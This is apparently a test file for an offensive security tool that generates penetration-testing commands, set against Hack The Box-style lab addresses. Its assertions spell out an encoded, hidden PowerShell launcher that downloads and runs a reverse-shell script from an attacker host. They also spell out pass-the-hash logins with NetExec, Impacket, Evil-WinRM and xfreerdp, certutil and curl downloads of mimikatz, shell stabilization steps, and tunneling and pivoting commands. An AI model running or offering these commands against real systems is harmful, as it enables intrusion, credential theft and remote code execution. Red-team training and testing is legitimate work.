import { describe, it, expect } from 'vitest';
import {
  encodePowerShellCommand,
  decodePowerShellCommand,
  buildPowerShellEncodedExecution,
  buildToolAuthCommand,
  generateFileTransferCommands,
  getTtyStabilizationSteps,
  generatePivotingCommands,
} from './offensiveForgeUtils';

describe('offensiveForgeUtils Engine', () => {
  describe('PowerShell UTF-16LE Base64 Encoder / Decoder', () => {
    it('accurately encodes and decodes PowerShell commands (roundtrip)', () => {
      const original = 'whoami /all; Get-Process | Where-Object { $_.CPU -gt 10 }';
      const encoded = encodePowerShellCommand(original);
      expect(encoded).toBeTruthy();
      expect(typeof encoded).toBe('string');

      const decoded = decodePowerShellCommand(encoded);
      expect(decoded).toBe(original);
    });

    it('generates standard obfuscated PowerShell execution wrapper', () => {
      const cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.2/rev.ps1")';
      const wrapper = buildPowerShellEncodedExecution(cmd);
      expect(wrapper).toContain('powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand');
      expect(wrapper).toContain(encodePowerShellCommand(cmd));
    });

    it('handles large multi-kilobyte script payloads without RangeError', () => {
      const largeScript = '$x = 1;\n'.repeat(5000); // 40KB+ script
      const encoded = encodePowerShellCommand(largeScript);
      expect(encoded.length).toBeGreaterThan(50000);

      const decoded = decodePowerShellCommand(encoded);
      expect(decoded).toBe(largeScript);
    });
  });

  describe('Smart Authentication Flag Builder (PTH vs Password)', () => {
    const targetIp = '10.10.10.161';
    const user = 'Administrator';
    const password = 'SuperSecretPassword123!';
    const ntlmHash = '31d6cfe0d16ae931b73c59d7e0c089c0';
    const domain = 'htb.local';

    // 1. NetExec (nxc)
    it('configures NetExec with -p for plaintext password and -H for NTLM hash', () => {
      const passResult = buildToolAuthCommand('netexec', targetIp, user, password, domain, { protocol: 'smb' });
      expect(passResult.isPassTheHash).toBe(false);
      expect(passResult.command).toContain(`nxc smb ${targetIp} -u '${user}' -p '${password}' -d '${domain}'`);

      const pthResult = buildToolAuthCommand('netexec', targetIp, user, ntlmHash, domain, { protocol: 'smb' });
      expect(pthResult.isPassTheHash).toBe(true);
      expect(pthResult.command).toContain(`nxc smb ${targetIp} -u '${user}' -H '${ntlmHash}' -d '${domain}'`);
    });

    // 2. Impacket
    it('configures Impacket with -hashes :<NTLM> for PTH and username:password for password', () => {
      const passResult = buildToolAuthCommand('impacket', targetIp, user, password, domain, { impacketBinary: 'wmiexec' });
      expect(passResult.isPassTheHash).toBe(false);
      expect(passResult.command).toBe(`impacket-wmiexec '${domain}/${user}:${password}@${targetIp}'`);

      const pthResult = buildToolAuthCommand('impacket', targetIp, user, ntlmHash, domain, { impacketBinary: 'wmiexec' });
      expect(pthResult.isPassTheHash).toBe(true);
      expect(pthResult.command).toBe(`impacket-wmiexec -hashes ':${ntlmHash}' '${domain}/${user}@${targetIp}'`);
    });

    // 3. Evil-WinRM
    it('configures Evil-WinRM with -H for NTLM hash and -p for password', () => {
      const passResult = buildToolAuthCommand('evil-winrm', targetIp, user, password);
      expect(passResult.isPassTheHash).toBe(false);
      expect(passResult.command).toBe(`evil-winrm -i ${targetIp} -u '${user}' -p '${password}'`);

      const pthResult = buildToolAuthCommand('evil-winrm', targetIp, user, ntlmHash);
      expect(pthResult.isPassTheHash).toBe(true);
      expect(pthResult.command).toBe(`evil-winrm -i ${targetIp} -u '${user}' -H ${ntlmHash}`);
    });

    // 4. xfreerdp
    it('configures xfreerdp with /pth for NTLM hash and /p for password', () => {
      const passResult = buildToolAuthCommand('xfreerdp', targetIp, user, password, domain);
      expect(passResult.isPassTheHash).toBe(false);
      expect(passResult.command).toContain(`/p:'${password}'`);
      expect(passResult.command).toContain(`/d:${domain}`);

      const pthResult = buildToolAuthCommand('xfreerdp', targetIp, user, ntlmHash, domain);
      expect(pthResult.isPassTheHash).toBe(true);
      expect(pthResult.command).toContain(`/pth:${ntlmHash}`);
    });
  });

  describe('File Transfer Command Suite', () => {
    it('generates attacker servers and cross-platform download commands', () => {
      const commands = generateFileTransferCommands('10.10.14.5', 8080, 'mimikatz.exe', 'loot');
      expect(commands.length).toBeGreaterThanOrEqual(10);

      // Check attacker server
      const smbServer = commands.find((c) => c.method.includes('Impacket SMB'));
      expect(smbServer?.command).toBe('impacket-smbserver loot $(pwd) -smb2support');

      // Check Linux download
      const curlCmd = commands.find((c) => c.method === 'cURL');
      expect(curlCmd?.command).toBe('curl -s http://10.10.14.5:8080/mimikatz.exe -o mimikatz.exe');

      // Check Windows download
      const certutilCmd = commands.find((c) => c.method.includes('Certutil'));
      expect(certutilCmd?.command).toContain('certutil.exe -urlcache -split -f http://10.10.14.5:8080/mimikatz.exe mimikatz.exe');
    });
  });

  describe('TTY Stabilization Sequence', () => {
    it('produces 5 structured steps with custom terminal rows and columns', () => {
      const steps = getTtyStabilizationSteps(40, 120);
      expect(steps.length).toBe(5);
      expect(steps[0].command).toContain('import pty; pty.spawn("/bin/bash")');
      expect(steps[2].command).toBe('stty raw -echo; fg');
      expect(steps[4].command).toBe('stty rows 40 columns 120');
    });
  });

  describe('Pivoting & Network Tunneling Commands', () => {
    it('generates Ligolo-ng, Chisel, SSH, and Windows Netsh commands', () => {
      const pivots = generatePivotingCommands('10.10.14.2', '172.16.1.0/24', '10.10.10.50', 8000, 8080, '172.16.1.10', 80);
      expect(pivots.length).toBeGreaterThanOrEqual(10);

      const ligoloRoute = pivots.find((p) => p.tool === 'ligolo-ng' && p.mode.includes('Route'));
      expect(ligoloRoute?.command).toBe('sudo ip route add 172.16.1.0/24 dev ligolo');

      const chiselClient = pivots.find((p) => p.tool === 'chisel' && p.mode.includes('SOCKS5'));
      expect(chiselClient?.command).toBe('./chisel client 10.10.14.2:8000 R:1080:socks');

      const sshDynamic = pivots.find((p) => p.tool === 'ssh' && p.mode.includes('Dynamic'));
      expect(sshDynamic?.command).toBe('ssh -N -D 1080 user@10.10.10.50');

      const netshAdd = pivots.find((p) => p.tool === 'netsh' && p.mode.includes('Add'));
      expect(netshAdd?.command).toContain('netsh interface portproxy add v4tov4 listenport=8000');
    });
  });
});
